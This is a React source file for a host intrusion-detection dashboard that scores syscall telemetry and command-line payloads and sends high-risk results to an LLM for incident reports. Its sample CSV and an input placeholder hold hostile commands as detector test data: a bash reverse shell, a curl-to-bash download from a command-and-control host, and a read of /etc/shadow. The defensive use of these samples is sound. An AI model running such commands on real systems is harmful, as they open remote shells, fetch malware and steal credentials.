import React, { useState, useEffect } from 'react';
import { Terminal, Shield, Cpu, Play, RotateCcw, AlertTriangle, CheckCircle, FileText, UploadCloud, Layers } from 'lucide-react';
import MetricCard from '../components/MetricCard';
import LLMReportView from '../components/LLMReportView';
import LogUploader from '../components/LogUploader';
import api from '../services/api';
import defaultLogsData from '../mockData/hostDefaultLogs.json';

const SAMPLE_HOST_CSV = `processId,parentProcessId,userId,mountNamespace,eventId,argsNum,returnValue,suspendCount,payload_text
2481,1204,1000,4026531840,59,2,0,0,python3 /opt/monitoring/health_check.py
8942,1,0,4026531840,157,6,-1,2,bash -i >& /dev/tcp/198.51.100.42/4444 0>&1
3102,1,1000,4026531840,59,2,0,0,node /var/www/api/server.js
9812,102,0,4026531840,101,8,-1,1,curl -s http://malware-c2.net/stage2.sh | bash
1045,1,1000,4026531840,3,1,0,0,cat /var/log/syslog
7721,1,0,4026531840,175,5,-1,1,chmod 777 /etc/shadow && sudo cat /etc/shadow`;

export default function HostDashboard({ onThreatUpdate }) {
  // Load default log payload on initial render
  const [formData, setFormData] = useState(defaultLogsData.default);
  const [activePreset, setActivePreset] = useState('malicious-reverse-shell');
  const [analysisResult, setAnalysisResult] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [activeTabMode, setActiveTabMode] = useState('single'); // 'single' | 'batch'
  const [errorMessage, setErrorMessage] = useState(null);

  // Auto-run analysis on initial mount with default values
  useEffect(() => {
    handleRunAnalysis(defaultLogsData.default);
  }, []);

  const handleInputChange = (field, value) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }));
  };

  const handleSelectPreset = (preset) => {
    setActivePreset(preset.id);
    setFormData(preset.data);
    handleRunAnalysis(preset.data);
  };

  const handleRunAnalysis = async (dataToAnalyze = formData) => {
    setIsLoading(true);
    setErrorMessage(null);
    try {
      const response = await api.analyzeHost(dataToAnalyze);
      setAnalysisResult(response);
      if (onThreatUpdate) {
        onThreatUpdate(response.risk_level);
      }
    } catch (err) {
      console.error('Host analysis error:', err);
      setErrorMessage(err?.response?.data?.message || err?.message || 'Failed to analyze host telemetry.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleBatchUpload = async (formDataPayload) => {
    const res = await api.analyzeHost(formDataPayload);
    if (res.incident_report) {
      setAnalysisResult((prev) => ({
        ...prev,
        incident_report: res.incident_report,
      }));
    }
    return res;
  };

  const compositeScore = analysisResult?.composite_score ?? 0.0;
  const hostIsolationScore = analysisResult?.host_isolation_score ?? 0.0;
  const payloadThreatProb = analysisResult?.payload_threat_probability ?? 0.0;
  const riskLevel = analysisResult?.risk_level ?? 'NORMAL';
  const isAnomaly = analysisResult?.is_anomaly ?? false;

  return (
    <div className="space-y-6">
      {/* Module Title Header */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-900 via-[#0c1629] to-slate-900 border border-slate-800 flex flex-wrap items-center justify-between gap-4">
        <div>
          <div className="flex items-center space-x-2 text-cyan-400 font-mono text-xs uppercase tracking-wider mb-1">
            <Terminal className="w-4 h-4" />
            <span>Telemetry Vector 01 // BETH Kernel Dataset</span>
          </div>
          <h2 className="text-xl font-bold text-white font-mono">
            Host Syscall & Payload Security Engine
          </h2>
          <p className="text-xs text-slate-400 mt-1">
            Dual-phase inference uniting kernel syscall execution patterns (Isolation Forest) with NLP payload token analysis (TF-IDF + Classifier).
          </p>
        </div>

        {/* View Mode Toggle */}
        <div className="flex items-center space-x-1 p-1 bg-slate-950/80 rounded-xl border border-slate-800 text-xs font-mono">
          <button
            onClick={() => setActiveTabMode('single')}
            className={`px-3 py-1.5 rounded-lg transition ${
              activeTabMode === 'single'
                ? 'bg-cyan-950 text-cyan-300 font-bold border border-cyan-800/60 shadow-sm'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            Telemetry Form & Presets
          </button>
          <button
            onClick={() => setActiveTabMode('batch')}
            className={`px-3 py-1.5 rounded-lg transition ${
              activeTabMode === 'batch'
                ? 'bg-cyan-950 text-cyan-300 font-bold border border-cyan-800/60 shadow-sm'
                : 'text-slate-400 hover:text-white'
            }`}
          >
            Batch CSV Ingestion
          </button>
        </div>
      </div>

      {/* Preset Quick Selectors */}
      <div className="flex flex-wrap items-center gap-2">
        <span className="text-xs font-mono text-slate-400 mr-2 flex items-center">
          <Layers className="w-3.5 h-3.5 mr-1 text-cyan-400" />
          Test Presets:
        </span>
        {defaultLogsData.presets.map((preset) => (
          <button
            key={preset.id}
            onClick={() => handleSelectPreset(preset)}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition ${
              activePreset === preset.id
                ? 'bg-cyan-950/90 text-cyan-300 border-cyan-500 shadow-md shadow-cyan-950'
                : 'bg-slate-900/60 text-slate-400 border-slate-800 hover:border-slate-700 hover:text-slate-200'
            }`}
          >
            {preset.name}
          </button>
        ))}
      </div>

      {/* Metric Cards Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <MetricCard
          title="Composite Threat Score"
          value={`${(compositeScore * 100).toFixed(1)}%`}
          score={compositeScore}
          threshold={0.65}
          subtitle="Formula: 50% Host Iso + 50% NLP Payload"
          badge={riskLevel}
          status={isAnomaly ? 'critical' : 'normal'}
          icon={Shield}
        />
        <MetricCard
          title="Host Isolation Score"
          value={`${(hostIsolationScore * 100).toFixed(1)}%`}
          score={hostIsolationScore}
          threshold={0.50}
          subtitle="Syscall behavior anomaly scale"
          badge={analysisResult?.host_prediction === -1 ? 'ANOMALY' : 'NORMAL'}
          status={analysisResult?.host_prediction === -1 ? 'critical' : 'normal'}
          icon={Terminal}
        />
        <MetricCard
          title="Payload Threat Probability"
          value={`${(payloadThreatProb * 100).toFixed(1)}%`}
          score={payloadThreatProb}
          threshold={0.65}
          subtitle="TF-IDF malicious token likelihood"
          badge={payloadThreatProb >= 0.65 ? 'MALICIOUS' : 'BENIGN'}
          status={payloadThreatProb >= 0.65 ? 'critical' : 'normal'}
          icon={FileText}
        />
        <MetricCard
          title="Inference Engine Mode"
          value={analysisResult?.fallback_mode ? 'Baseline Heuristic' : 'ML Pipeline'}
          subtitle={analysisResult?.fallback_mode ? 'Joblib models not found in disk' : 'Isolation Forest + LogReg'}
          badge={analysisResult?.fallback_mode ? 'STANDBY' : 'TRAINED'}
          status={analysisResult?.fallback_mode ? 'warning' : 'normal'}
          icon={Cpu}
        />
      </div>

      {/* Main Content Area */}
      {activeTabMode === 'batch' ? (
        <div className="rounded-xl border border-slate-800 bg-[#0c1322] p-6">
          <h3 className="text-sm font-mono font-semibold uppercase tracking-wider text-cyan-400 mb-1">
            Batch Host Syscall Log Ingestion
          </h3>
          <p className="text-xs text-slate-400 mb-4">
            Upload CSV trace file containing processId, userId, eventId, and payload command lines.
          </p>
          <LogUploader
            moduleTitle="Host Syscall & Payload (BETH)"
            onUploadBatch={handleBatchUpload}
            sampleCsvData={SAMPLE_HOST_CSV}
            sampleFileName="host_telemetry_batch.csv"
          />
        </div>
      ) : (
        /* Single Form Editor */
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Telemetry Input Form */}
          <div className="lg:col-span-6 rounded-xl border border-slate-800 bg-[#0c1322] p-6 space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <h3 className="text-xs font-mono font-semibold uppercase tracking-wider text-cyan-400 flex items-center">
                <Terminal className="w-4 h-4 mr-1.5" />
                Kernel Syscall & Process Telemetry
              </h3>
              <span className="text-[11px] font-mono text-slate-500">BETH Trace Spec</span>
            </div>

            <div className="grid grid-cols-2 gap-3 text-xs font-mono">
              <div>
                <label className="text-slate-400 block mb-1">Process ID (processId)</label>
                <input
                  type="number"
                  value={formData.processId}
                  onChange={(e) => handleInputChange('processId', parseInt(e.target.value) || 0)}
                  className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-white focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-slate-400 block mb-1">Parent PID (parentProcessId)</label>
                <input
                  type="number"
                  value={formData.parentProcessId}
                  onChange={(e) => handleInputChange('parentProcessId', parseInt(e.target.value) || 0)}
                  className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-white focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-slate-400 block mb-1">User ID (0 = root)</label>
                <input
                  type="number"
                  value={formData.userId}
                  onChange={(e) => handleInputChange('userId', parseInt(e.target.value) || 0)}
                  className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-white focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-slate-400 block mb-1">Syscall Event ID (eventId)</label>
                <input
                  type="number"
                  value={formData.eventId}
                  onChange={(e) => handleInputChange('eventId', parseInt(e.target.value) || 0)}
                  className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-white focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-slate-400 block mb-1">Argument Count (argsNum)</label>
                <input
                  type="number"
                  value={formData.argsNum}
                  onChange={(e) => handleInputChange('argsNum', parseInt(e.target.value) || 0)}
                  className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-white focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="text-slate-400 block mb-1">Return Code (returnValue)</label>
                <input
                  type="number"
                  value={formData.returnValue}
                  onChange={(e) => handleInputChange('returnValue', parseInt(e.target.value) || 0)}
                  className="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-white focus:border-cyan-500 focus:outline-none"
                />
              </div>
            </div>

            {/* Payload Text Input */}
            <div className="pt-2">
              <label className="text-xs font-mono text-slate-400 block mb-1 flex justify-between">
                <span>Command Line / Payload Text (NLP Analysis)</span>
                <span className="text-[10px] text-cyan-400">TF-IDF Vectorized</span>
              </label>
              <textarea
                rows={3}
                value={formData.payload_text}
                onChange={(e) => handleInputChange('payload_text', e.target.value)}
                placeholder="e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
                className="w-full bg-slate-900 border border-slate-800 rounded-lg p-3 text-xs font-mono text-emerald-400 focus:border-cyan-500 focus:outline-none resize-none"
              />
            </div>

            {/* Action Buttons */}
            <div className="flex items-center justify-between pt-2">
              <button
                type="button"
                onClick={() => setFormData(defaultLogsData.default)}
                className="flex items-center space-x-1.5 px-3 py-2 rounded-lg bg-slate-900 hover:bg-slate-800 text-xs font-mono text-slate-400 border border-slate-800 transition"
              >
                <RotateCcw className="w-3.5 h-3.5" />
                <span>Reset Default</span>
              </button>

              <button
                type="button"
                onClick={() => handleRunAnalysis(formData)}
                disabled={isLoading}
                className="flex items-center space-x-2 px-5 py-2 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-slate-950 text-xs font-mono font-bold shadow-lg shadow-cyan-950 transition disabled:opacity-50"
              >
                <Play className="w-3.5 h-3.5 fill-current" />
                <span>{isLoading ? 'Analyzing Telemetry...' : 'Run Host Analysis'}</span>
              </button>
            </div>

            {errorMessage && (
              <div className="p-3 rounded-lg bg-rose-950/70 border border-rose-800 text-xs font-mono text-rose-300 flex items-center space-x-2">
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
                <span>{errorMessage}</span>
              </div>
            )}
          </div>

          {/* Realtime Threat Breakdown Panel */}
          <div className="lg:col-span-6 rounded-xl border border-slate-800 bg-[#0c1322] p-6 space-y-5 flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                <h3 className="text-xs font-mono font-semibold uppercase tracking-wider text-cyan-400 flex items-center">
                  <Shield className="w-4 h-4 mr-1.5" />
                  Composite Score Breakdown
                </h3>
                <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${
                  isAnomaly ? 'bg-rose-950 text-rose-400 border-rose-700' : 'bg-emerald-950 text-emerald-400 border-emerald-700'
                }`}>
                  {isAnomaly ? 'ANOMALY DETECTED' : 'NORMAL ACTIVITY'}
                </span>
              </div>

              {/* Formula Visualizer */}
              <div className="mt-4 p-4 rounded-lg bg-slate-950/90 border border-slate-800 text-xs font-mono space-y-3">
                <div className="text-slate-400 text-[11px]">
                  COMPOSITE SCORING CALCULATION:
                </div>
                <div className="p-2.5 rounded bg-slate-900 border border-slate-800 text-cyan-300 text-center font-bold">
                  ({(hostIsolationScore).toFixed(4)} × 0.50) + ({(payloadThreatProb).toFixed(4)} × 0.50) = <span className="text-white">{(compositeScore).toFixed(4)}</span>
                </div>

                <div className="space-y-2 pt-2">
                  <div>
                    <div className="flex justify-between text-[11px] text-slate-400 mb-1">
                      <span>Host Syscall Isolation Weight (50%)</span>
                      <span className="text-cyan-400">{(hostIsolationScore * 0.5 * 100).toFixed(1)}%</span>
                    </div>
                    <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden">
                      <div className="h-full bg-cyan-500 rounded-full" style={{ width: `${hostIsolationScore * 100}%` }} />
                    </div>
                  </div>

                  <div>
                    <div className="flex justify-between text-[11px] text-slate-400 mb-1">
                      <span>NLP Payload Probability Weight (50%)</span>
                      <span className="text-purple-400">{(payloadThreatProb * 0.5 * 100).toFixed(1)}%</span>
                    </div>
                    <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden">
                      <div className="h-full bg-purple-500 rounded-full" style={{ width: `${payloadThreatProb * 100}%` }} />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="p-4 rounded-lg bg-slate-900/60 border border-slate-800 text-xs font-mono text-slate-300">
              <span className="text-slate-400">Trigger Threshold:</span> <strong className="text-white">0.65</strong>
              <p className="text-[11px] text-slate-400 mt-1">
                When the Composite Threat Score reaches 0.65 or above, the Groq Llama-3.3-70b engine is immediately invoked to formulate incident response playbooks.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Section 3: Automated Groq LLM Incident Report */}
      <div className="pt-2">
        <div className="flex items-center space-x-2 mb-3">
          <Cpu className="w-4 h-4 text-cyan-400" />
          <h3 className="text-sm font-mono font-semibold uppercase tracking-wider text-white">
            Automated SOC Incident Response Playbook (Groq llama-3.3-70b-versatile)
          </h3>
        </div>
        <LLMReportView
          report={analysisResult?.incident_report}
          isLoading={isLoading}
        />
      </div>
    </div>
  );
}

